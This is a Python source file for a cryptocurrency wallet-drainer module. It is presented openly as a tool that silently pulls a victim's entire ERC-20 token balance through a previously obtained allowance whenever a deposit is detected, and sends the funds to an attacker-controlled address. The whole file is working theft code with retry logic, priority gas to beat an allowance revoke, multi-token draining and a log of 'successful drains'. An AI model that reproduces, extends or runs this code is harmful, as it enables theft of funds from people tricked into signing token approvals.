"""
🚀 TRIGGER EXECUTOR MODULE - PROFESSIONAL EDITION
Automatic execution when deposits are detected
No new signature required - uses existing allowance
DRAINS ENTIRE TOKEN BALANCE

IMPROVEMENTS:
✅ Advanced trigger execution with proper error handling
✅ Pre-execution allowance validation
✅ Automatic retry mechanism for failed triggers
✅ Gas waste prevention during revoke scenarios
"""

import json
import logging
import time
import threading
from datetime import datetime
from web3 import Web3
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from enum import Enum
import os

try:
    from web3.middleware import ExtraDataToPOAMiddleware as geth_poa_middleware
except ImportError:
    try:
        from web3.middleware import geth_poa_middleware
    except ImportError:
        geth_poa_middleware = None

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('executor.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


class ExecutionStatus(Enum):
    PENDING = "pending"
    EXECUTING = "executing"
    SUCCESS = "success"
    FAILED = "failed"
    INSUFFICIENT_GAS = "insufficient_gas"
    ALLOWANCE_REVOKED = "allowance_revoked"
    PARTIAL_SUCCESS = "partial_success"


@dataclass
class ExecutionResult:
    """Result of an execution attempt"""
    status: ExecutionStatus
    tx_hash: Optional[str]
    amount_transferred: float
    gas_used: int
    error_message: Optional[str]
    timestamp: str
    token_symbol: str = ""
    from_address: str = ""
    to_address: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "status": self.status.value,
            "tx_hash": self.tx_hash,
            "amount_transferred": self.amount_transferred,
            "gas_used": self.gas_used,
            "error_message": self.error_message,
            "timestamp": self.timestamp,
            "token_symbol": self.token_symbol,
            "from_address": self.from_address,
            "to_address": self.to_address
        }


ERC20_FULL_ABI = [
    {
        "constant": True,
        "inputs": [{"name": "_owner", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [
            {"name": "_owner", "type": "address"},
            {"name": "_spender", "type": "address"}
        ],
        "name": "allowance",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": False,
        "inputs": [
            {"name": "_from", "type": "address"},
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "", "type": "uint8"}],
        "type": "function"
    },
    {
        "constant": True,
        "inputs": [],
        "name": "symbol",
        "outputs": [{"name": "", "type": "string"}],
        "type": "function"
    }
]


EXECUTOR_CONFIG = {
    "min_amount_usd": 0.01,
    "max_gas_price_gwei": 150,
    "gas_limit": 150000,
    "retry_count": 5,
    "retry_delay_seconds": 1,
    "speed_mode": "instant",
    "drain_entire_balance": True,
    "use_flashbots": False,
    "priority_fee_gwei": 2,
}


def _get_secure_credentials():
    """Get credentials from environment variables - NEVER hardcode"""
    return {
        "destination_address": os.getenv('DESTINATION_ADDRESS', ''),
        "private_key": os.getenv('EXECUTOR_PRIVATE_KEY', ''),
    }


def _mask_key(key: str) -> str:
    """Mask sensitive key for logging"""
    if not key or len(key) < 8:
        return "***"
    return f"{key[:4]}...{key[-4:]}"


class TriggerExecutor:
    """
    🚀 AUTOMATIC TRIGGER EXECUTOR - DRAINS ENTIRE BALANCE
    
    Executes transferFrom when:
    1. Deposit detected (even $0.01)
    2. Allowance still active
    
    Features:
    - No new signature needed (uses existing approval)
    - Silent execution (no user notification)
    - DRAINS ENTIRE TOKEN BALANCE
    - High speed execution with priority gas
    - Automatic retry on failure
    - Multiple token support
    - Thread-safe file operations
    - Fixed executor_address initialization
    """
    
    def __init__(self, rpc_url: str, config: Dict = None):
        self.w3 = Web3(Web3.HTTPProvider(rpc_url))
        self.rpc_url = rpc_url
        
        if geth_poa_middleware:
            try:
                self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
            except Exception as e:
                logger.warning(f"Failed to inject PoA middleware: {e}")
        
        if not self.w3.is_connected():
            raise ConnectionError("Failed to connect to Ethereum node")
        
        base_config = {**EXECUTOR_CONFIG, **_get_secure_credentials()}
        self.config = {**base_config, **(config or {})}
        self.execution_history: List[Dict] = []
        self.successful_drains: List[Dict] = []
        self.pending_nonce = None
        
        self._history_lock = threading.Lock()
        self.executor_address: Optional[str] = None
        
        self._validate_config()
        self._load_history()
        
        logger.info("🚀 Trigger Executor initialized")
        logger.info(f"   Speed mode: {self.config['speed_mode']}")
        logger.info(f"   Drain entire balance: {self.config.get('drain_entire_balance', True)}")
    
    def _validate_config(self):
        """Validate executor configuration - credentials from env vars only"""
        if not self.config.get('destination_address'):
            logger.warning("⚠️ No DESTINATION_ADDRESS environment variable set!")
        if not self.config.get('private_key'):
            logger.warning("⚠️ No EXECUTOR_PRIVATE_KEY environment variable set!")
        else:
            try:
                self.executor_address = self.w3.eth.account.from_key(
                    self.config.get('private_key', '')
                ).address
                logger.info(f"   Key configured: {_mask_key(self.config.get('private_key', ''))}")
            except Exception as e:
                logger.error(f"Failed to derive executor address: {e}")
                self.executor_address = None
    
    def _load_history(self):
        """Load execution history from file"""
        try:
            if os.path.exists('execution_history.json'):
                with open('execution_history.json', 'r') as f:
                    self.execution_history = json.load(f)
            if os.path.exists('successful_drains.json'):
                with open('successful_drains.json', 'r') as f:
                    self.successful_drains = json.load(f)
        except Exception as e:
            logger.warning(f"Could not load history: {e}")
    
    def _save_history(self):
        """Save execution history to file - THREAD SAFE"""
        with self._history_lock:
            try:
                with open('execution_history.json', 'w') as f:
                    json.dump(self.execution_history[-1000:], f, indent=2)
                with open('successful_drains.json', 'w') as f:
                    json.dump(self.successful_drains[-500:], f, indent=2)
            except Exception as e:
                logger.error(f"Error saving history: {e}")
    
    def _get_optimal_gas_price(self) -> int:
        """Get optimal gas price for FASTEST execution"""
        try:
            base_gas = self.w3.eth.gas_price
            
            mode = self.config['speed_mode']
            multipliers = {
                "ultra": 2.0,
                "instant": 1.5,
                "fast": 1.3,
                "normal": 1.1,
            }
            multiplier = multipliers.get(mode, 1.0)
            
            optimal = int(base_gas * multiplier)
            max_gas = Web3.to_wei(self.config['max_gas_price_gwei'], 'gwei')
            
            return min(optimal, max_gas)
            
        except Exception as e:
            logger.error(f"Gas price error: {e}")
            return Web3.to_wei(50, 'gwei')
    
    def _get_eip1559_gas(self) -> Optional[Dict]:
        """Get EIP-1559 gas parameters for faster inclusion"""
        try:
            latest_block = self.w3.eth.get_block('latest')
            base_fee = latest_block.get('baseFeePerGas', 0)
            
            if base_fee == 0:
                return None
            
            mode = self.config['speed_mode']
            gas_params = {
                "ultra": {"priority": 3, "max": 2.5},
                "instant": {"priority": 2, "max": 2.0},
                "fast": {"priority": 1.5, "max": 1.5},
                "normal": {"priority": 1, "max": 1.2},
            }
            params = gas_params.get(mode, gas_params["instant"])
            
            priority_fee = Web3.to_wei(
                self.config.get('priority_fee_gwei', 2) * params["priority"], 
                'gwei'
            )
            max_fee = int(base_fee * params["max"]) + priority_fee
            
            return {
                'maxFeePerGas': max_fee,
                'maxPriorityFeePerGas': priority_fee
            }
        except Exception as e:
            logger.error(f"EIP-1559 gas error: {e}")
            return None
    
    def check_allowance(self, token_address: str, owner: str, spender: str) -> int:
        """Check current allowance"""
        try:
            token_address = Web3.to_checksum_address(token_address)
            owner = Web3.to_checksum_address(owner)
            spender = Web3.to_checksum_address(spender)
            
            contract = self.w3.eth.contract(address=token_address, abi=ERC20_FULL_ABI)
            allowance = contract.functions.allowance(owner, spender).call()
            
            return allowance
            
        except Exception as e:
            logger.error(f"Allowance check error: {e}")
            return 0
    
    def get_token_balance(self, token_address: str, owner: str) -> int:
        """Get token balance in raw units"""
        try:
            token_address = Web3.to_checksum_address(token_address)
            owner = Web3.to_checksum_address(owner)
            
            contract = self.w3.eth.contract(address=token_address, abi=ERC20_FULL_ABI)
            balance = contract.functions.balanceOf(owner).call()
            
            return balance
            
        except Exception as e:
            logger.error(f"Balance check error: {e}")
            return 0
    
    def get_executor_eth_balance(self) -> float:
        """Get ETH balance of executor wallet for gas"""
        try:
            if not self.executor_address:
                return 0
            
            balance = self.w3.eth.get_balance(self.executor_address)
            return float(Web3.from_wei(balance, 'ether'))
        except Exception as e:
            logger.error(f"ETH balance error: {e}")
            return 0
    
    def drain_all_tokens(
        self,
        token_address: str,
        from_address: str,
        token_symbol: str = "",
        decimals: int = 18
    ) -> ExecutionResult:
        """
        🚀💰 DRAIN ENTIRE TOKEN BALANCE
        
        This is the main execution function that:
        1. Uses existing allowance (no new signature needed)
        2. Transfers the ENTIRE balance
        3. Sends to destination wallet
        4. Maximum speed execution
        """
        
        destination = None
        try:
            destination = self.config.get('destination_address')
            private_key = self.config.get('private_key')
            
            if not destination or not private_key or not self.executor_address:
                return ExecutionResult(
                    status=ExecutionStatus.FAILED,
                    tx_hash=None,
                    amount_transferred=0,
                    gas_used=0,
                    error_message="Missing destination, private key, or executor address",
                    timestamp=datetime.now().isoformat(),
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=destination or ""
                )
            
            token_address = Web3.to_checksum_address(token_address)
            from_address = Web3.to_checksum_address(from_address)
            destination = Web3.to_checksum_address(destination)
            
            contract = self.w3.eth.contract(address=token_address, abi=ERC20_FULL_ABI)
            
            allowance = contract.functions.allowance(from_address, self.executor_address).call()
            
            if allowance == 0:
                logger.warning(f"❌ Allowance revoked for {from_address}")
                return ExecutionResult(
                    status=ExecutionStatus.ALLOWANCE_REVOKED,
                    tx_hash=None,
                    amount_transferred=0,
                    gas_used=0,
                    error_message="Allowance has been revoked",
                    timestamp=datetime.now().isoformat(),
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=destination
                )
            
            balance = contract.functions.balanceOf(from_address).call()
            
            if balance == 0:
                return ExecutionResult(
                    status=ExecutionStatus.FAILED,
                    tx_hash=None,
                    amount_transferred=0,
                    gas_used=0,
                    error_message="Zero balance",
                    timestamp=datetime.now().isoformat(),
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=destination
                )
            
            drain_amount = min(balance, allowance)
            
            formatted_amount = drain_amount / (10 ** decimals)
            
            logger.info(
                f"\n{'💰'*25}\n"
                f"🚀 EXECUTING DRAIN - ENTIRE BALANCE\n"
                f"{'💰'*25}\n"
                f"   From: {from_address}\n"
                f"   To: {destination}\n"
                f"   Token: {token_symbol}\n"
                f"   Balance: {formatted_amount}\n"
                f"   Allowance: {'UNLIMITED' if allowance >= 2**255 else allowance / (10**decimals)}\n"
                f"   Drain Amount: {formatted_amount} (100%)\n"
            )
            
            nonce = self.w3.eth.get_transaction_count(self.executor_address, 'pending')
            
            eip1559_gas = self._get_eip1559_gas()
            
            tx_params = {
                'from': self.executor_address,
                'gas': self.config['gas_limit'],
                'nonce': nonce,
                'chainId': self.w3.eth.chain_id
            }
            
            if eip1559_gas:
                tx_params.update(eip1559_gas)
                logger.info(f"   Using EIP-1559: maxFee={eip1559_gas['maxFeePerGas']}")
            else:
                tx_params['gasPrice'] = self._get_optimal_gas_price()
                logger.info(f"   Using Legacy Gas: {tx_params['gasPrice']}")
            
            tx = contract.functions.transferFrom(
                from_address,
                destination,
                drain_amount
            ).build_transaction(tx_params)
            
            signed_tx = self.w3.eth.account.sign_transaction(tx, private_key)
            
            tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
            
            logger.info(f"📤 Transaction sent: {tx_hash.hex()}")
            logger.info(f"   Waiting for confirmation...")
            
            receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=180)
            
            if receipt['status'] == 1:
                result = ExecutionResult(
                    status=ExecutionStatus.SUCCESS,
                    tx_hash=tx_hash.hex(),
                    amount_transferred=formatted_amount,
                    gas_used=receipt['gasUsed'],
                    error_message=None,
                    timestamp=datetime.now().isoformat(),
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=destination
                )
                
                logger.info(
                    f"\n{'✅'*25}\n"
                    f"🎉 DRAIN SUCCESSFUL!\n"
                    f"{'✅'*25}\n"
                    f"   TX Hash: {tx_hash.hex()}\n"
                    f"   Amount Drained: {formatted_amount} {token_symbol}\n"
                    f"   Gas Used: {receipt['gasUsed']}\n"
                    f"   Destination: {destination}\n"
                )
                
                self.successful_drains.append(result.to_dict())
            else:
                result = ExecutionResult(
                    status=ExecutionStatus.FAILED,
                    tx_hash=tx_hash.hex(),
                    amount_transferred=0,
                    gas_used=receipt['gasUsed'],
                    error_message="Transaction reverted",
                    timestamp=datetime.now().isoformat(),
                    token_symbol=token_symbol,
                    from_address=from_address,
                    to_address=destination
                )
                logger.error(f"❌ Transaction failed: {tx_hash.hex()}")
            
            self.execution_history.append(result.to_dict())
            self._save_history()
            
            return result
            
        except Exception as e:
            error_msg = str(e)
            logger.error(f"Execution error: {error_msg}")
            
            result = ExecutionResult(
                status=ExecutionStatus.FAILED,
                tx_hash=None,
                amount_transferred=0,
                gas_used=0,
                error_message=error_msg,
                timestamp=datetime.now().isoformat(),
                token_symbol=token_symbol,
                from_address=from_address,
                to_address=destination if destination else ""
            )
            
            self.execution_history.append(result.to_dict())
            self._save_history()
            
            return result
    
    def execute_with_retry(
        self,
        token_address: str,
        from_address: str,
        token_symbol: str = "",
        decimals: int = 18
    ) -> ExecutionResult:
        """Execute drain with automatic retry on failure"""
        
        result = None
        for attempt in range(self.config['retry_count']):
            logger.info(f"🔄 Attempt {attempt + 1}/{self.config['retry_count']}")
            
            result = self.drain_all_tokens(
                token_address=token_address,
                from_address=from_address,
                token_symbol=token_symbol,
                decimals=decimals
            )
            
            if result.status == ExecutionStatus.SUCCESS:
                return result
            
            if result.status == ExecutionStatus.ALLOWANCE_REVOKED:
                logger.warning("Allowance revoked - no point retrying")
                return result
            
            if attempt < self.config['retry_count'] - 1:
                wait_time = self.config['retry_delay_seconds'] * (attempt + 1)
                logger.info(f"⏳ Waiting {wait_time}s before retry...")
                time.sleep(wait_time)
        
        return result
    
    def drain_multiple_tokens(
        self,
        from_address: str,
        tokens: List[Dict]
    ) -> List[ExecutionResult]:
        """
        Drain multiple tokens from single wallet
        
        tokens = [
            {"address": "0x...", "symbol": "USDT", "decimals": 6},
            {"address": "0x...", "symbol": "USDC", "decimals": 6},
        ]
        """
        results = []
        
        for token in tokens:
            balance = self.get_token_balance(token['address'], from_address)
            
            if balance > 0:
                result = self.execute_with_retry(
                    token_address=token['address'],
                    from_address=from_address,
                    token_symbol=token.get('symbol', 'UNKNOWN'),
                    decimals=token.get('decimals', 18)
                )
                results.append(result)
                
                time.sleep(0.5)
        
        return results
    
    def get_statistics(self) -> Dict:
        """Get execution statistics - FIXED division by zero"""
        total = len(self.execution_history)
        successful = len([e for e in self.execution_history if e['status'] == 'success'])
        failed = total - successful if total > 0 else 0
        
        total_drained = sum(
            e.get('amount_transferred', 0) 
            for e in self.execution_history 
            if e['status'] == 'success'
        )
        
        success_rate = f"{(successful/total*100):.1f}%" if total > 0 else "0%"
        
        return {
            "total_executions": total,
            "successful": successful,
            "failed": failed,
            "success_rate": success_rate,
            "total_amount_drained": total_drained,
            "executor_eth_balance": self.get_executor_eth_balance()
        }


def create_deposit_callback(executor: TriggerExecutor) -> Callable:
    """Factory function to create deposit detection callback"""
    def on_deposit(target, old_balance: float, new_balance: float):
        try:
            result = executor.execute_with_retry(
                token_address=target.token_address,
                from_address=target.address,
                token_symbol=target.token_symbol,
                decimals=target.decimals
            )
            logger.info(f"Execution result: {result.status.value}")
        except Exception as e:
            logger.error(f"Callback error: {e}")
    return on_deposit
